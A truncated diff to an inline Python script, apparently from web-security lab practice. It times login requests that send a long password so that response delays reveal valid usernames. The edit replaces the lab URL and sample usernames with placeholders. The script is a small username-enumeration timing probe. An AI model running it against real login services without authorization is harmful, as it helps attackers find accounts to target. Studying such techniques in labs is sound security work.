@@ -2,10 +2,10 @@ python3 - <<'EOF'
 import requests
 import time
 
-base_url = "URL"
+base_url = "REPLACE_WITH_TARGET_URL"
 long_pass = "A" * 100
 
-for username in ["fakeuser123", "wiener"]:
+for username in ["REPLACE_WITH_KNOWN_FAKE_USERNAME", "REPLACE_WITH_YOUR_OWN_TEST_ACCOUNT", "REPLACE_WITH_CANDIDATE_USERNAME"]:
     start = time.time()
     r = requests.post(
         f"{base_url}/login",
